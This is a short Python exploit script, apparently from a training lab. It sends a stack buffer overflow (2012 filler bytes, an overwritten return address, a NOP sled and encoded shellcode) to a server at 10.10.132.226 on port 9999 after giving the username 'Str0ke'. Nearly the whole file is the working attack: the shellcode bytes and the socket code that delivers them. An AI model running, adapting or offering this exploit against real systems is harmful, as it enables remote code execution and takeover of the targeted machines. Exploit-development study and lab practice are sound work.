import socket
import sys

username = b"Str0ke"
message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32

payload = (
b"\xb8\x48\xb6\xf7\x06\xd9\xec\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
b"\x52\x31\x43\x12\x03\x43\x12\x83\x8b\xb2\x15\xf3\xf7\x53\x5b"
b"\xfc\x07\xa4\x3c\x74\xe2\x95\x7c\xe2\x67\x85\x4c\x60\x25\x2a"
b"\x26\x24\xdd\xb9\x4a\xe1\xd2\x0a\xe0\xd7\xdd\x8b\x59\x2b\x7c"
b"\x08\xa0\x78\x5e\x31\x6b\x8d\x9f\x76\x96\x7c\xcd\x2f\xdc\xd3"
b"\xe1\x44\xa8\xef\x8a\x17\x3c\x68\x6f\xef\x3f\x59\x3e\x7b\x66"
b"\x79\xc1\xa8\x12\x30\xd9\xad\x1f\x8a\x52\x05\xeb\x0d\xb2\x57"
b"\x14\xa1\xfb\x57\xe7\xbb\x3c\x5f\x18\xce\x34\xa3\xa5\xc9\x83"
b"\xd9\x71\x5f\x17\x79\xf1\xc7\xf3\x7b\xd6\x9e\x70\x77\x93\xd5"
b"\xde\x94\x22\x39\x55\xa0\xaf\xbc\xb9\x20\xeb\x9a\x1d\x68\xaf"
b"\x83\x04\xd4\x1e\xbb\x56\xb7\xff\x19\x1d\x5a\xeb\x13\x7c\x33"
b"\xd8\x19\x7e\xc3\x76\x29\x0d\xf1\xd9\x81\x99\xb9\x92\x0f\x5e"
b"\xbd\x88\xe8\xf0\x40\x33\x09\xd9\x86\x67\x59\x71\x2e\x08\x32"
b"\x81\xcf\xdd\x95\xd1\x7f\x8e\x55\x81\x3f\x7e\x3e\xcb\xcf\xa1"
b"\x5e\xf4\x05\xca\xf5\x0f\xce\xff\x01\x65\xd0\x68\x10\x79\xcf"
b"\x41\x9d\x9f\x65\x82\xcb\x08\x12\x3b\x56\xc2\x83\xc4\x4c\xaf"
b"\x84\x4f\x63\x50\x4a\xb8\x0e\x42\x3b\x48\x45\x38\xea\x57\x73"
b"\x54\x70\xc5\x18\xa4\xff\xf6\xb6\xf3\xa8\xc9\xce\x91\x44\x73"
b"\x79\x87\x94\xe5\x42\x03\x43\xd6\x4d\x8a\x06\x62\x6a\x9c\xde"
b"\x6b\x36\xc8\x8e\x3d\xe0\xa6\x68\x94\x42\x10\x23\x4b\x0d\xf4"
b"\xb2\xa7\x8e\x82\xba\xed\x78\x6a\x0a\x58\x3d\x95\xa3\x0c\xc9"
b"\xee\xd9\xac\x36\x25\x5a\xdc\x7c\x67\xcb\x75\xd9\xf2\x49\x18"
b"\xda\x29\x8d\x25\x59\xdb\x6e\xd2\x41\xae\x6b\x9e\xc5\x43\x06"
b"\x8f\xa3\x63\xb5\xb0\xe1"
)

try:
    print("Sending Payload...")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.132.226', 9999))
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')
    s.recv(1024)
    s.send(message + payload + b'\r\n')
    s.recv(1024)
    s.close()
    
except:
    print("Connot Connect")
    sys.exit()